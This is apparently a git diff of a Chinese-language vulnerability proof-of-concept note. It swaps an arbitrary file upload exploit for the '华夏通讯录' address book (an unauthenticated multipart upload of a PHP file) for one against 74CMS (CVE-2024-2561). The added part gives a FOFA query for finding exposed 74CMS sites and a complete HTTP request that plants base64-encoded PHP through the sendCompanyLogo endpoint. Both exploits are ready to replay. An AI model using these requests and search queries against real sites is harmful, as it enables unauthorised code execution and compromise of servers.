@@ -1,40 +1,44 @@
-华夏通讯录存在前台upload任意文件上传
+# 74CMS存在任意文件上传漏洞(CVE-2024-2561)
 
-华夏通讯录存在前台由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过/admin/common/upload接口进行任意文件上传。
+74CMS存在任意文件上传漏洞(CVE-2024-2561)，漏洞地址存在与sendCompanyLogo文件中/controller/company/Index.php#sendCompanyLogo的组件Company Logo Handler。经修改后的参数:imgBase64恶意代码输入可导致rce。
 
-fofa
-```
-icon_hash="1403225079" && ":) APPV1"
+## fofa
+
+```javascript
+app="骑士-74CMS"
 ```
 
-poc
-```
-POST /admin/common/upload HTTP/1.1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br, zstd
-Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+## poc
+
+```javascript
+POST /v1_0/company/index/sendCompanyLogo HTTP/1.1
+Host: localhost:7888
 Cache-Control: max-age=0
-Connection: keep-alive
-Content-Length: 197
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIGQdzBsWlq43t3JA
-Cookie: PHPSESSID=719psss6jnv9112q6spakfmt32; md5=201920; visitor_source=http%3A%2F%2F127.0.0.1%3A81%2Findex
-Host: 127.0.0.1:81
-Origin: http://127.0.0.1:81
-Referer: http://127.0.0.1:81/admin/common/upload
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: none
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
-sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
+sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
 sec-ch-ua-mobile: ?0
-sec-ch-ua-platform: "Windows"
-sec-fetch-user: ?1
+sec-ch-ua-platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+user-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2215212345678%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ%22%7D
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
 
-------WebKitFormBoundary03rNBzFMIytvpWhy
-Content-Disposition: form-data; name="file"; filename="1.php"
-Content-Type: image/jpeg
-
-<?php phpinfo();?>
-------WebKitFormBoundary03rNBzFMIytvpWhy--
+imgBase64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
 ```
+
+![image-20250206164242391](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061642460.png)
+
+
+
+## 漏洞来源
+
+- https://gist.github.com/Southseast/9f5284d8ee0f6d91e72eef73b285512a
